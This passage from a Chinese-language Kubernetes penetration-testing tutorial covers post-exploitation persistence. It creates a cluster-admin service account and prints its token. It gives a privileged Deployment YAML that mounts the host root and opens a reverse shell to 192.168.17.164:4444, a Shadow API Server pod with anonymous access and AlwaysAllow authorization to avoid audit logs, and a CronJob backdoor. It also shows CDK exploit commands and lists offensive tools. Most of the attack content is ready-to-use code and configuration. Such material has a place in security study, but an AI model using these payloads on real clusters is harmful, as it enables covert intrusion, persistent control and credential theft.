5dk3c_x8aKh-fLSZ-ncpMBf35GGisUHzsdPWup_fqoQKZr4TcEMYc2FcooDQ_mnhBL-WVTbHM9z-LEcebTaCepYR7f-655nRXrDWQe3H524Vvak9aEHI9xK8qHWk1546ka14fMsYTqi3Ra-Tg
```

Step 10：使用默认用户的 token 登录  
[![](assets/1701606868-f33fbed224eabb834a623c59936c1fd3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142918-2856dac8-7492-1.png)  
之后发现权限略有不足：  
[![](assets/1701606868-4c82f98b8fa4074537a98ba61f4de267.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142932-30581aa2-7492-1.png)  
Step 11：新建管理员  
a、创建 serviceaccount

```bash
kubectl create serviceaccount admin-myuser -n kubernetes-dashboard
```

b、绑定集群管理员

```bash
kubectl create clusterrolebinding  dashboard-cluster-admin --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:admin-myuser
```

```bash
kubectl get sa,secrets -n kubernetes-dashboard
```

[![](assets/1701606868-c55fee78364db6c3ace9752016a851e2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143020-4d641a06-7492-1.png)  
c、查看 token

```bash
kubectl describe secret admin-myuser-token-jcj9d -n kubernetes-dashboard
```

[![](assets/1701606868-9794f312303f318219e16480dbe0e4d0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143044-5b7b8ae8-7492-1.png)

```bash
eyJhbGciOiJSUzI1NiIsImtpZCI6Iml3OVRtaVlnREpPQ0h2ZlUwSDBleFlIc29qcXgtTmtaUFN4WDk4NjZkV1EifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi1teXVzZXItdG9rZW4tamNqOWQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiYWRtaW4tbXl1c2VyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYjM5MjBlZWEtMzA1NS00ZDQzLWEyMWMtNDk4MDEwM2NhMjhmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmVybmV0ZXMtZGFzaGJvYXJkOmFkbWluLW15dXNlciJ9.DC1dSWMY46GzOZiSDsQWjO2dNIQ6ZsO_KDDfWjJ74m8ugPoklduiPeLj85n2NI03NKzCpXOaRRUR4LZHHT5KrpKFTsA9uPQyC0Lb3vi-UUZuQ4uhAZrzOxHx82tIcgNBSv-hXvIZytSrgm3RaItH20O3D-3NTEPt00ohD54cq6FyQPBqGi5yseLlTKj4Z2exbCCHxie67ID8ykaNnwcC8Ay1Ccznlvqu8ffdTejrcqFEyGZqHW3NuBxtYGkh_THdZIGHxaeqgLlGb7i2SbOr3IPeQGlf9l-rRKFSIMqvK_0SFBM9BiA0A4lEv26ro2LC4_PxF6o5_QOAz7X0E65hfw
```

Step 12：登录 dashboard

[![](assets/1701606868-df80189e2a5d086fc70203ff1f315408.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143101-656ae2a6-7492-1.png)  
[![](assets/1701606868-4a6619e28a3ee08c9cf0b42ed3c77a5e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143107-693c1738-7492-1.png)  
随后可以进行逃逸等操作，具体看上篇，这里不再赘述

## 权限维持

### Deployment 特性

#### 基本概述

如果创建容器时启用了 DaemonSets、Deployments 那么便可以使容器和子容器即使被清理掉了也可以恢复，攻击者可利用这个特性实现持久化，相关概念如下：  
ReplicationController(RC)：ReplicationController 确保在任何时候都有特定数量的 Pod 副本处于运行状态  
Replication Set(RS)：官方推荐使用 RS 和 Deployment 来代替 RC，实际上 RS 和 RC 的功能基本一致，目前唯一的一个区别就是 RC 只支持基于等式的 selector  
Deployment：主要职责和 RC 一样，都是保证 Pod 的数量和健康，二者大部分功能都是完全一致的，可以看成是一个升级版的 RC 控制器，官方组件 kube-dns、kube-proxy 也都是使用的 Deployment 来管理

#### 手动实现

Step 1：创建 dep.yaml 文件并加入恶意载荷

```bash
#dep.yaml
apiVersion: apps/v1
kind: Deployment                #确保在任何时候都有特定数量的 Pod 副本处于运行状态
metadata:
  name: nginx-deploy
  labels:
    k8s-app: nginx-demo
spec:
  replicas: 3                   #指定 Pod 副本数量
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: nginx
        image: nginx:1.7.9
        imagePullPolicy: IfNotPresent
        command: ["bash"]       #反弹 Shell
        args: ["-c", "bash -i >& /dev/tcp/192.168.17.164/4444 0>&1"]
        securityContext:
          privileged: true      #特权模式
        volumeMounts:
        - mountPath: /host
          name: host-root
      volumes:
      - name: host-root
        hostPath:
          path: /
          type: Directory
```

[![](assets/1701606868-b23ccab3d47b7c26d0134cd7cdf9b2ec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143226-983ed94e-7492-1.png)  
Step 2：使用 kubectl 来创建后门 Pod

```bash
#创建
kubectl create -f dep.yaml
```

[![](assets/1701606868-fd35a85ff6d22cb77d95a6150de9fce4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143242-a1edd04e-7492-1.png)  
Step 3：成功反弹 shell 回来，且为节点的 shell  
[![](assets/1701606868-143844978aa982c16b51a8caa1e56921.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143252-a7a1dbf2-7492-1.png)  
Step 4：查看当前权限发现属于特权模式

```bash
cat /proc/self/status | grep CapEff
```

[![](assets/1701606868-b01c70b008dbb47aadf4986620e4aeba.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143308-b1540c24-7492-1.png)  
Step 6：之后切换至 host 目录下可以看到成功挂载宿主机目录

```bash
cd host
cd home
```

[![](assets/1701606868-95b9c461accf088245ef8e8ae50f9ede.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143328-bd83a824-7492-1.png)  
Step 7：删除 pod

```bash
kubectl delete -f dep.yaml
```

[![](assets/1701606868-900b26f1ccdcd5009c4b804d3c933d0e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143346-c7f56450-7492-1.png)

#### 工具实现

```bash
./cdk run k8s-backdoor-daemonset (default|anonymous|<service-account-token-path>) <image>

Request Options:
default: connect API server with pod's default service account token
anonymous: connect API server with user system:anonymous
<service-account-token-path>: connect API server with user-specified service account token.

Exploit Options:
<image>: your backdoor image (you can upload it to dockerhub before)
```

[![](assets/1701606868-18f4eddf02cb3e24c8a10475f9903ce1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143432-e3ab62b2-7492-1.png)

### Shadow API 利用

#### 基本概述

Shadow API Server 攻击技术由安全研究人员 Ian Coldwater 在"Advanced Persistence Threats: The Future of Kubernetes Attacks"中首次提出，该攻击手法旨在创建一种针对 K8S 集群的隐蔽持续控制通道  
[![](assets/1701606868-938bcda77f4f721b7931fda81773cce6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143542-0d27a4de-7493-1.png)  
Shadow API Server 攻击技术的思路是创建一个具有 API Server 功能的 Pod，后续命令通过新的"Shadow API Server"下发，新的 API Server 创建时可以开放更大权限，并放弃采集审计日志，且不影响原有 API-Server 功能，日志不会被原有 API-Server 记录，从而达到隐蔽性和持久控制目的

#### 手动实现

Step 1：首先查看 kube-system 命名空间下的 kube-apiserver 信息

```bash
kubectl get pods -n kube-system | grep kube-apiserver
```

[![](assets/1701606868-d7cd9eb9a8c6f13bf3535d33e28ac023.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143604-1a52e7f4-7493-1.png)  
Step 2：查看 kube-apiserver-master 对应的 YAML 文件

```bash
kubectl get pods -n kube-system kube-apiserver-master -o yaml
```

[![](assets/1701606868-46886e59db9283e673137fba6ae30d87.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143625-2683002c-7493-1.png)  
Step 3：复制上述 YAML 内容并进行如下修改

```bash
#更新配置
--allow-privileged=true
--insecure-port=6445
--insecure-bind-address=0.0.0.0
--secure-port=6445
--anonymous-auth=true
--authorization-mode=AlwaysAllow

#删除子项
status
metadata.selfLink
metadata.uid
metadata.annotations
metadata.resourceVersion
metadata.creationTimestamp
spec.tolerations
```

最终配置文件如下：

```bash
apiVersion: v1
kind: Pod
metadata:
  labels:
    component: kube-apiserver-shadow
    tier: control-plane
  name: kube-apiserver-shadow
  namespace: kube-system
  ownerReferences:
  - apiVersion: v1
    controller: true
    kind: Node
    name: master
    uid: a8b24753-c6b2-477e-9884-03784cf52afb
spec:
  containers:
  - command:
    - kube-apiserver
    - --advertise-address=192.168.17.144
    - --allow-privileged=true
    - --anonymous-auth=true
    - --authorization-mode=AlwaysAllow
    - --client-ca-file=/etc/kubernetes/pki/ca.crt
    - --enable-admission-plugins=NodeRestriction
    - --enable-bootstrap-token-auth=true
    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key
    - --etcd-servers=https://127.0.0.1:2379
    - --insecure-port=9443
    - --insecure-bind-address=0.0.0.0
    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt
    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key
    - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname
    - --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt
    - --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key
    - --requestheader-allowed-names=front-proxy-client
    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt
    - --requestheader-extra-headers-prefix=X-Remote-Extra-
    - --requestheader-group-headers=X-Remote-Group
    - --requestheader-username-headers=X-Remote-User
    - --secure-port=9444
    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
    - --service-cluster-ip-range=192.96.0.0/12
    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
    image: registry.aliyuncs.com/google_containers/kube-apiserver:v1.17.4
    imagePullPolicy: IfNotPresent
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 192.168.17.144
        path: /healthz
        port: 9443
        scheme: HTTPS
      initialDelaySeconds: 15
      periodSeconds: 10
      successThreshold: 1
      timeoutSeconds: 15
    name: kube-apiserver
    resources:
      requests:
        cpu: 250m
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /etc/ssl/certs
      name: ca-certs
      readOnly: true
    - mountPath: /etc/pki
      name: etc-pki
      readOnly: true
    - mountPath: /etc/kubernetes/pki
      name: k8s-certs
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  hostNetwork: true
  nodeName: master
  priority: 2000000000
  priorityClassName: system-cluster-critical
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  terminationGracePeriodSeconds: 30
  volumes:
  - hostPath:
      path: /etc/ssl/certs
      type: DirectoryOrCreate
    name: ca-certs
  - hostPath:
      path: /etc/pki
      type: DirectoryOrCreate
    name: etc-pki
  - hostPath:
      path: /etc/kubernetes/pki
      type: DirectoryOrCreate
    name: k8s-certs
```

Step 4：创建一个附加由 API Server 功能的 pod

```bash
kubectl create -f api.yaml
```

[![](assets/1701606868-0e3fa2ddd1d1ebd9bf1d3854307cfccc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143803-615a65aa-7493-1.png)  
Step 5：端口服务查看  
[![](assets/1701606868-0e584f49848bdaac12a39d41c867db83.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143816-68f5296c-7493-1.png)  
Step 6：在浏览器中实现未授权访问测试  
[![](assets/1701606868-977aefbe83150a9ce60bdced66bd3c13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143832-728c7c3c-7493-1.png)  
Step 7：在命令行中实现未授权访问

```bash
kubectl -s http://192.168.17.144:9443 get nodes
```

[![](assets/1701606868-d6cadc2b36648afbf103aaf5db1a8d94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143848-7bca1b1a-7493-1.png)

#### 工具实现

Step 1：在 Pod 中使用 CDK 寻找脆弱点

```bash
cdk evaluate
```

[![](assets/1701606868-29957193ca2b58d13ad0535ede63f296.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143918-8e200892-7493-1.png)  
Step 2：发现当前 Pod 内置 Service account 具有高权限，接下来使用 EXP 部署 Shadow API Server

```bash
cdk run k8s-shadow-apiserver default
```

[![](assets/1701606868-e1f36ef40732d9ea0cd99be57d5bf0a0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143937-9939be26-7493-1.png)  
Step 3：部署成功之后，后续渗透操作全部由新的 Shadow API Server 代理，由于打开了无鉴权端口，任何 pod 均可直接向 Shadow API Server 发起请求管理集群  
[![](assets/1701606868-77f8a475af15b76324b5e01b006c3730.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143949-a01a2802-7493-1.png)  
Step 4：获取 K8s 的 Secrets 凭据信息

[![](assets/1701606868-3bf744c21a853524f196d120e7dece11.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144000-a725e4ce-7493-1.png)

### K8s CronJob

#### 基本概述

CronJob 用于执行周期性的动作，例如：备份、报告生成等，攻击者可以利用此功能持久化

#### 具体实现

Step 1：创建 cron.yaml 文件

```bash
apiVersion: batch/v1beta1
kind: CronJob                    #使用 CronJob 对象
metadata:
  name: hello
spec:
  schedule: "*/1 * * * *"        #每分钟执行一次
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: hello
            image: alpine
            imagePullPolicy: IfNotPresent
            command:
            - /bin/bash
            - -c
            - #反弹 Shell 或者下载并执行木马
          restartPolicy: OnFailure
```

[![](assets/1701606868-031e5df2c515c0af01994f8331bd6dca.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144042-bfe3c7ce-7493-1.png)  
Step 2：部署 pod

```bash
kubectl create -f cron.yaml
```

[![](assets/1701606868-1d988b83ffd9213ff09b3301c8fd7b8c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144059-ca058eb8-7493-1.png)  
Step 3：之后再监听端并未获取到 shell  
[![](assets/1701606868-9374ec96f4f94d43dae8a907714e5249.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144240-068d51ea-7494-1.png)  
随后发现未反弹回 shell 的原因是因为 IP 网段问题，相关测试如下  
Step 1：测试 yaml 文件

```bash
apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: hello
spec:
  schedule: "*/1 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: hello
            image: busybox
            args:
            - /bin/sh
            - -c
            - ifconfig; echo Hello aliang
          restartPolicy: OnFailure
```

Step 2：部署后查看 logs  
[![](assets/1701606868-6f3c78acdaec2c5b30f1885833583430.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144405-394634ee-7494-1.png)

#### 工具实现

使用方法：

```bash
cdk run k8s-cronjob (default|anonymous|<service-account-token-path>) (min|hour|day|<cron-expr>) <image> <args>

Request Options:
default: connect API server with pod's default service account token
anonymous: connect API server with user system:anonymous
<service-account-token-path>: connect API server with user-specified service account token.

Cron Options:
min: deploy cronjob with schedule "* * * * *"
hour: deploy cronjob with schedule "0 * * * *"
day: deploy cronjob with schedule "0 0 * * *"
<cron-expr>: your custom cron expression

Exploit Options:
<image>: your backdoor image (you can upload it to dockerhub before)
<args>: your custom shell command which will run when container creates
```

使用实例：

```bash
./cdk run k8s-cronjob default min alpine "echo hellow;echo cronjob"
```

[![](assets/1701606868-be565b26aff5fccecd73bd802efc4491.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144443-4fe50482-7494-1.png)  
执行之后：

[![](assets/1701606868-d7585697ded01929e186967041bdd0a2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144454-55ecd1d4-7494-1.png)

## 工具推荐

### Nebula

Nebula 是一个云和 DevOps 渗透测试框架，它为每个提供者和每个功能构建了模块，截至 2021 年 4 月，它仅涵盖 AWS，但目前是一个正在进行的项目，有望继续发展以测试 GCP、Azure、Kubernetes、Docker 或 Ansible、Terraform、Chef 等自动化引擎  
[https://github.com/gl4ssesbo1/Nebula](https://github.com/gl4ssesbo1/Nebula)

[![](assets/1701606868-51d7957c3cba751f0dbf2238a62f9bd2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027145025-1b2eecd4-7495-1.png)

### k0otkit

k0otkit 是一种通用的后渗透技术，可用于对 Kubernetes 集群的渗透，攻击者可以使用 k0otkit 快速、隐蔽和连续的方式 (反向 shell) 操作目标 Kubernetes 集群中的所有节点，K0otkit 使用到的技术主要有以下几个：

*   kube-proxy 镜像 (就地取材)
*   动态容器注入 (高隐蔽性)
*   Meterpreter(流量加密)
*   无文件攻击 (高隐蔽性)

DaemonSet 和 Secret 资源 (快速持续反弹、资源分离)  
[![](assets/1701606868-a047c305429eb5c4b0eee1a3527f64ba.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027145158-52b182de-7495-1.png)

### CDK Tools

CDK 是一款为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及 PoC/EXP，集成 Docker/K8s 场景特有的逃逸、横向移动、持久化利用方式，插件化管理  
[https://github.com/cdk-team/CDK](https://github.com/cdk-team/CDK)  
[![](assets/1701606868-df6566676441465bdc03f4c9bd3691ea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144752-c01c8022-7494-1.png)

### Kubesploit:

Kubesploit 是一个功能强大的跨平台后渗透漏洞利用 HTTP/2 命令&控制服务器和代理工具，基于 Merlin 项目实现其功能，主要针对的是容器化环境的安全问题  
[https://github.com/cyberark/kubesploit](https://github.com/cyberark/kubesploit)  
[![](assets/1701606868-12da2565d27161116ab99ccb6145f0c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144813-cd15504c-7494-1.png)

## 参考链接

[https://youtu.be/GupI5nUgQ9I](https://youtu.be/GupI5nUgQ9I)  
[https://capsule8.com/blog/practical-container-escape-exercise/](https://capsule8.com/blog/practical-container-escape-exercise/)  
[https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html)  
[https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)  
[https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/writeup.md#escaping-the-container-and-popping-a-root-shell](https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/writeup.md#escaping-the-container-and-popping-a-root-shell)  
[https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)  
[https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2021-31440](https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2021-31440)  
[https://man7.org/linux/man-pages/man5/core.5.html](https://man7.org/linux/man-pages/man5/core.5.html)  
[https://github.com/Metarget/metarget/tree/master/writeups\_cnv/mount-host-procfs](https://github.com/Metarget/metarget/tree/master/writeups_cnv/mount-host-procfs)
